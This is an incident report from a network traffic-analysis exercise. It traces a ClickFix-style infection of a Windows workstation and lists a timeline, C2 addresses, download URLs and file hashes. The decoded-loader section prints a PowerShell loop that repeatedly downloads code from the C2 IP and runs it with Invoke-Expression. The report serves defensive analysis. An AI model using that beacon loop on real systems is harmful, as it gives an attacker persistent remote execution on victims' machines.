# Incident Report — 2025-01-22 Traffic Analysis Exercise

## Victim Host
| Field | Value |
|---|---|
| IPv4 | 10.1.17.215 |
| MAC | 00:d0:b7:26:4a:74 |
| Windows hostname | DESKTOP-L8C5GSJ (domain: bluemoontuesday.com) |
| Logged-in user | shutchenson |

Grounding: ARP binds the MAC to 10.1.17.215. DHCP option 12 and NBNS both report hostname `DESKTOP-L8C5GSJ` for that IP. Kerberos `CNameString` shows `shutchenson` authenticating from 10.1.17.215 against DC 10.1.17.2.

## Malware Family
**Attribution: behavioral, not signature-confirmed** (no IDS/Suricata alert exports were provided alongside the pcap — only the capture itself).

The observed chain is a **ClickFix-style fake-verification lure delivering a PowerShell downloader that establishes a persistent HTTP beacon and then deploys renamed TeamViewer components for hands-on-keyboard remote access** — the behavioral signature commonly attributed to **DarkGate**. Supporting behavior:
- Infection starts with a TLS session to `authenticatoor.org` (a known fake-CAPTCHA/"verify you are human" ClickFix lure pattern).
- A `.sct` (Windows Script Component) file is fetched and contains VBScript that silently launches hidden PowerShell to pull a stage-1 loader.
- The loader keys its C2 identity off the `C:\` volume serial number and polls the C2 in an infinite `DownloadString` / `Invoke-Expression` loop — classic beacon-and-execute-arbitrary-commands behavior.
- The C2 subsequently pushes down TeamViewer binaries renamed `TV`, `TeamViewer`, `Teamviewer_Resource_fr` — consistent with the known DarkGate technique of abusing a bundled TeamViewer component for hidden/hVNC-style remote control, distinct from the host's legitimate TeamViewer traffic (which went to the real `master16.teamviewer.com`, 185.188.32.26).
- A dead C2 domain, `ping3.dyngate.com`, is queried 344 times and always returns NXDOMAIN (rcode 3) — a hardcoded backup/decoy C2 domain the malware never gave up retrying.

## Timeline
| t (rel. sec) | Event |
|---|---|
| 39.4 | TLS to 82.221.136.26, SNI `authenticatoor.org` — ClickFix lure page |
| 60.3 | GET `/api/file/get-file/264872` from 5.252.153.241 — `.sct` VBScript downloader |
| 62.1 | GET `/api/file/get-file/29842.ps1` — stage-1 obfuscated PS loader |
| 62.4–124.7 | Beacon check-ins every ~5s to `/1517096937` (bot ID = hex-decoded C: volume serial) |
| 125.0–129.0 | Second-stage pulls: `TeamViewer`, `Teamviewer_Resource_fr`, `TV`, `pas.ps1`; status reports "startup shortcut created... success" and "script: RunRH, status: OK, message: PS process started" |
| 889.8 onward | TLS to 45.125.66.32:2917 (self-signed cert, CN = bare IP) — largest single conversation by volume (≈10 MB), consistent with an interactive remote-control session |

## Indicators of Compromise

**C2 endpoints**
- `5.252.153.241:80` — HTTP loader/beacon C2 (bot ID = decimal volume serial `1517096937`)
- `45.125.66.32:2917` — TLS C2/remote-control channel, self-signed certificate with CN = the IP itself, no real hostname
- `82.221.136.26:443` — TLS to lure/delivery host

**Domains**
- `authenticatoor.org` — ClickFix fake-verification lure (TLS SNI to 82.221.136.26)
- `ping3.dyngate.com` — queried 344 times, all NXDOMAIN; hardcoded dead/backup C2 domain

**URLs (all to 5.252.153.241)**
- `http://5.252.153.241/api/file/get-file/264872`
- `http://5.252.153.241/api/file/get-file/29842.ps1`
- `http://5.252.153.241/api/file/get-file/pas.ps1`
- `http://5.252.153.241/api/file/get-file/TV`
- `http://5.252.153.241/api/file/get-file/TeamViewer`
- `http://5.252.153.241/api/file/get-file/Teamviewer_Resource_fr`
- `http://5.252.153.241/1517096937` (beacon check-in)
- `http://5.252.153.241/1517096937?k=message%20=%20startup%20shortcut%20created;...` (status report)
- `http://5.252.153.241/1517096937?k=script:%20RunRH,%20status:%20OK,...` (status report)

**Transferred files (extracted via `tshark --export-objects http`, SHA256 computed)**
| File name | SHA256 | Type |
|---|---|---|
| 264872 | c74123dbccded43fda61651e102750b041d4c3af6fda88cd6436f9276653e103 | `.sct` VBScript downloader (HTML/text) |
| 29842.ps1 | b8ce40900788ea26b9e4c9af7efab533e8d39ed1370da09b93fcf72a16750ded | Obfuscated PS stage-1 loader |
| pas.ps1 | a833f27c2bb4cad31344e70386c44b5c221f031d7cd2f2a6b8601919e790161e | Obfuscated PS stage-2 loader (identical loop logic, decoded) |
| TV | 3448da03808f24568e6181011f8521c0713ea6160efd05bff20c43b091ff59f7 | PE32 DLL (stripped, disguised) |
| TeamViewer | 904280f20d697d876ab90a1b74c0f22a83b859e8b0519cb411fda26f1642f53e | PE32 GUI executable |
| Teamviewer_Resource_fr | 9634ecaf469149379bba80a745f53d823948c41ce4e347860701cbdff6935192 | PE32 GUI DLL |

Both PS scripts decode (base64, junk-character stripped) to an identical loop: read the `C:\` volume serial number as a bot ID, then `while($true){ DownloadString("http://5.252.153.241/"+serial) | Invoke-Expression; sleep 5 }` — a persistent, arbitrary-command C2 beacon.

## Benign Context (not IOCs)
- Domain traffic to `bluemoontuesday.com` AD domain (LDAP, Kerberos, DCE-RPC, NBNS/CLDAP to 10.1.17.2 — the DC)
- Legitimate TeamViewer client traffic to `master16.teamviewer.com` (185.188.32.26)
- Microsoft/Windows telemetry, Windows Update, Office/Copilot/Edge/MSN endpoints, `login.microsoftonline.com`
- Google (`clients2.google.com`, `googleusercontent.com`), NTP (`pool.ntp.org`, `time-a-g.nist.gov`), mDNS/LLMNR/SSDP background noise

## Summary
Windows workstation DESKTOP-L8C5GSJ (10.1.17.215, MAC 00:d0:b7:26:4a:74), logged in as domain user `shutchenson`, was infected via a ClickFix-style fake-verification lure at `authenticatoor.org`. The lure triggered a hidden PowerShell chain that pulled a `.sct` downloader and a persistent PowerShell beacon from `5.252.153.241`, which then deployed disguised TeamViewer components for remote control and opened a longer-lived TLS channel to `45.125.66.32:2917`. Behavior matches DarkGate's known ClickFix-delivery/hVNC-via-TeamViewer pattern; attribution is behavioral only, as no IDS signatures were available in this evidence set.
